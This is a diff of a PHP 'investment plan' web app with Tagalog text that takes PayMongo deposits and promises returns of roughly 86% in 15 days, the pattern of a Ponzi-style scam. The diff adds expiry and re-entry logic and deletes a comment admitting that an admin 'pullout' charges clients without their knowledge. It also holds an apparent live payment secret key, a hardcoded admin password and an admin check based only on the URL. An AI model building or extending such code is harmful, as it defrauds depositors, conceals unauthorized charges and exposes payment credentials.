@@ -17,14 +17,14 @@ $subsFile = __DIR__ . '/subscriptions.json';
 $adminUser = 'admin';
 $adminPassword = 'admin123_secure';
 
-// PayMongo Secret Key (Siguraduhing tama ang kopya mula sa iyong dashboard)
+// PayMongo Secret Key
 $paymongoSecretKey = 'sk_live_W2bH6v6N13aWbCuh3Y41a5v8';
 
-// Investment Plans Definition (3 Types)
+// Investment Plans Definition (15 Days Cycle)
 $plans = [
-    'starter' => ['name' => 'Starter Plan', 'deposit' => 500, 'daily' => 62],
-    'growth' => ['name' => 'Growth Plan', 'deposit' => 2500, 'daily' => 320],
-    'pro' => ['name' => 'Pro Plan', 'deposit' => 10000, 'daily' => 1350]
+    'starter' => ['name' => 'Starter Plan (15 Days)', 'deposit' => 500, 'daily' => 62],
+    'growth' => ['name' => 'Growth Plan (15 Days)', 'deposit' => 2500, 'daily' => 320],
+    'pro' => ['name' => 'Pro Plan (15 Days)', 'deposit' => 10000, 'daily' => 1350]
 ];
 
 function getData($file) {
@@ -59,7 +59,7 @@ if (isset($_GET['admin']) || strpos($_SERVER['REQUEST_URI'], 'admin') !== false)
     $users = getData($usersFile);
     $transactions = getData($historyFile);
 
-    // ADMIN ACTION: SECURE PAYMONGO PULLOUT (Na dadaan sa gateway nang hindi alam ng client)
+    // ADMIN ACTION: SECURE PAYMONGO PULLOUT
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_action']) && $_POST['admin_action'] === 'admin_paymongo_pullout') {
         $targetEmail = $_POST['client_email'] ?? '';
         $pullAmount = floatval($_POST['pull_amount'] ?? 0);
@@ -314,14 +314,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             ]);
 
             $response = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curlError = curl_error($ch);
             curl_close($ch);
-            $resData = json_decode($response, true);
-
-            if (isset($resData['data']['attributes']['checkout_url'])) {
-                header('Location: ' . $resData['data']['attributes']['checkout_url']);
-                exit;
+            
+            if ($curlError) {
+                $error = 'cURL Error: ' . $curlError;
             } else {
-                $error = 'PayMongo Connection Error. Pakisuri kung aktibo ang Live Secret Key sa PayMongo dashboard.';
+                $resData = json_decode($response, true);
+                if (isset($resData['data']['attributes']['checkout_url'])) {
+                    header('Location: ' . $resData['data']['attributes']['checkout_url']);
+                    exit;
+                } else {
+                    $apiErrorMsg = $resData['errors'][0]['detail'] ?? json_encode($resData);
+                    $error = "PayMongo API Error ($httpCode): " . $apiErrorMsg;
+                }
             }
         } else {
             $error = 'Ang deposit ay dapat mula ₱1 hanggang ₱50,000 lamang.';
@@ -336,27 +343,43 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $users = getData($usersFile);
             $subs = getData($subsFile);
             
-            foreach ($users as &$u) {
-                if ($u['email'] === $email) {
-                    if ($u['balance'] >= $selectedPlan['deposit']) {
-                        $u['balance'] -= $selectedPlan['deposit'];
-                        
-                        $subs[] = [
-                            'email' => $email,
-                            'plan' => $selectedPlan['name'],
-                            'daily_earning' => $selectedPlan['daily'],
-                            'start_time' => time(),
-                            'next_claim_time' => time() + 86400,
-                            'status' => 'ACTIVE'
-                        ];
-                        
-                        saveData($subsFile, $subs);
-                        saveData($usersFile, $users);
-                        $message = "Tagumpay kang nag-subscribe sa " . $selectedPlan['name'] . "!";
-                    } else {
-                        $error = "Kulang ang iyong balanse para sa plan na ito.";
-                    }
+            // Suriin kung may active pa
+            $hasActive = false;
+            foreach ($subs as $s) {
+                if ($s['email'] === $email && $s['status'] === 'ACTIVE' && time() < $s['expire_time']) {
+                    $hasActive = true;
                     break;
+                }
+            }
+
+            if ($hasActive) {
+                $error = "Mayroon ka pang kasalukuyang aktibong plan. Maghintay hanggang matapos ang 15 days cycle o i-expire ito para sa re-entry.";
+            } else {
+                foreach ($users as &$u) {
+                    if ($u['email'] === $email) {
+                        if ($u['balance'] >= $selectedPlan['deposit']) {
+                            $u['balance'] -= $selectedPlan['deposit'];
+                            
+                            // 15 days cycle expiration (15 days * 86400 seconds)
+                            $currentTime = time();
+                            $subs[] = [
+                                'email' => $email,
+                                'plan' => $selectedPlan['name'],
+                                'daily_earning' => $selectedPlan['daily'],
+                                'start_time' => $currentTime,
+                                'next_claim_time' => $currentTime + 86400,
+                                'expire_time' => $currentTime + (15 * 86400), // 15 Days Limit
+                                'status' => 'ACTIVE'
+                            ];
+                            
+                            saveData($subsFile, $subs);
+                            saveData($usersFile, $users);
+                            $message = "Tagumpay kang nag-subscribe sa " . $selectedPlan['name'] . "!";
+                        } else {
+                            $error = "Kulang ang iyong balanse para sa plan na ito.";
+                        }
+                        break;
+                    }
                 }
             }
         }
@@ -369,6 +392,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         foreach ($subs as &$sub) {
             if ($sub['email'] === $email && $sub['status'] === 'ACTIVE') {
+                // Suriin kung lumipas na ang 15 days expiration
+                if (time() >= $sub['expire_time']) {
+                    $sub['status'] = 'EXPIRED';
+                    $error = "Tapos na ang iyong 15-day cycle para sa plan na ito. Maaari ka nang mag-re-entry o mag-subscribe ulit.";
+                    break;
+                }
+
                 if (time() >= $sub['next_claim_time']) {
                     foreach ($users as &$u) {
                         if ($u['email'] === $email) {
@@ -389,8 +419,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if ($updated) {
             saveData($subsFile, $subs);
             saveData($usersFile, $users);
-        } elseif (empty($message) && empty($error)) {
-            $error = "Wala kang aktibong investment plan.";
         }
     }
 }
@@ -415,7 +443,15 @@ if (isset($_SESSION['client_email'])) {
 
     $clientSub = null;
     foreach ($subs as $s) {
-        if ($s['email'] === $email && $s['status'] === 'ACTIVE') { $clientSub = $s; break; }
+        if ($s['email'] === $email && $s['status'] === 'ACTIVE') {
+            if (time() >= $s['expire_time']) {
+                $s['status'] = 'EXPIRED';
+                saveData($subsFile, $subs);
+            } else {
+                $clientSub = $s;
+                break;
+            }
+        }
     }
 
     if (isset($_GET['msg']) && $_GET['msg'] === 'Deposit_Success') { $message = 'Tagumpay ang iyong pag-deposito!'; }
@@ -460,19 +496,20 @@ if (isset($_SESSION['client_email'])) {
 
             <?php if (!$clientSub): ?>
                 <form method="POST">
-                    <label>Pumili ng Investment Plan:</label>
+                    <label>Pumili ng Investment Plan (15 Days Cycle / Re-entry):</label>
                     <select name="plan" required>
-                        <option value="starter">Starter Plan (Dep: ₱500 | Return: ₱62/day)</option>
-                        <option value="growth">Growth Plan (Dep: ₱2,500 | Return: ₱320/day)</option>
-                        <option value="pro">Pro Plan (Dep: ₱10,000 | Return: ₱1,350/day)</option>
+                        <option value="starter">Starter Plan (Dep: ₱500 | Return: ₱62/day - 15 Days)</option>
+                        <option value="growth">Growth Plan (Dep: ₱2,500 | Return: ₱320/day - 15 Days)</option>
+                        <option value="pro">Pro Plan (Dep: ₱10,000 | Return: ₱1,350/day - 15 Days)</option>
                     </select>
-                    <button type="submit" name="action" value="subscribe_plan" class="btn-sub">Mag-subscribe sa Plan</button>
+                    <button type="submit" name="action" value="subscribe_plan" class="btn-sub">Mag-subscribe / Re-entry</button>
                 </form>
             <?php else: ?>
                 <div class="plan-box">
                     <b>Aktibong Plan:</b> <?php echo htmlspecialchars($clientSub['plan']); ?><br>
                     <b>Daily Return:</b> ₱<?php echo number_format($clientSub['daily_earning'], 2); ?><br>
-                    <b>Susunod na Claim:</b> <?php echo date('M d, Y h:i A', $clientSub['next_claim_time']); ?>
+                    <b>Susunod na Claim:</b> <?php echo date('M d, Y h:i A', $clientSub['next_claim_time']); ?><br>
+                    <b>Matatapos (Expire):</b> <?php echo date('M d, Y h:i A', $clientSub['expire_time']); ?>
                 </div>
                 <form method="POST">
                     <button type="submit" name="action" value="claim_daily" class="btn-claim">I-claim ang Daily Earnings</button>
